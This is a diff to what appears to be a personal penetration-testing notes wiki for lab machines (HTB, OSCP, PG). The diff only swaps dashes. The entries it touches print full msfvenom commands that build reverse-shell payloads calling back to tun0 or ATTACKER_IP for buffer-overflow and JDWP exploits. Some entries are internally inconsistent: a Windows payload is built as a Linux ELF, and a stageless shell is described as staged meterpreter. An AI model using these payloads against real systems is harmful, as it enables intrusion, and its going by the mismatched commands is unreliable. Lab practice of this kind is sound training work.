@@ -65,14 +65,14 @@ See also: [[Reverse-Shells]] for manual shell one-liners, [[File-Transfers]] for
 
 ## From Your Boxes
 
-> **Buff** (HTB) — msfvenom shellcode for CloudMe buffer overflow exploit through chisel tunnel
+> **Buff** (HTB) - msfvenom shellcode for CloudMe buffer overflow exploit through chisel tunnel
 > - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8080 -b '\x00\x0A\x0D' -f python -v payload`
-> - Lesson: For buffer overflows, use `-b` to exclude bad characters and `-f python` for exploit script integration. First tried port 53 but it failed — try different ports if shell doesn't connect
+> - Lesson: For buffer overflows, use `-b` to exclude bad characters and `-f python` for exploit script integration. First tried port 53 but it failed - try different ports if shell doesn't connect
 
-> **Berlin** (Course/OSCP B) — msfvenom ELF binary for Linux privesc when nc/bash shells wouldn't trigger through JDWP exploit
+> **Berlin** (Course/OSCP B) - msfvenom ELF binary for Linux privesc when nc/bash shells wouldn't trigger through JDWP exploit
 > - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=8443 -f elf > shell.elf`, transferred to target, ran through proxychains jdwp-shellifier
 > - Lesson: When one-liner shells fail through an exploit, an msfvenom ELF/EXE binary is more reliable. Stageless (`shell_reverse_tcp`) works with plain nc listener
 
-> **Internal** (PG/Windows) — msfvenom meterpreter payload for MS09-050 SMB buffer overflow on Server 2008
+> **Internal** (PG/Windows) - msfvenom meterpreter payload for MS09-050 SMB buffer overflow on Server 2008
 > - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=80 EXITFUNC=thread -f python`
-> - Lesson: For buffer overflow exploits, use `EXITFUNC=thread` to avoid crashing the service. Meterpreter is staged — requires msfconsole handler (uses your one Metasploit allowance)
+> - Lesson: For buffer overflow exploits, use `EXITFUNC=thread` to avoid crashing the service. Meterpreter is staged - requires msfconsole handler (uses your one Metasploit allowance)
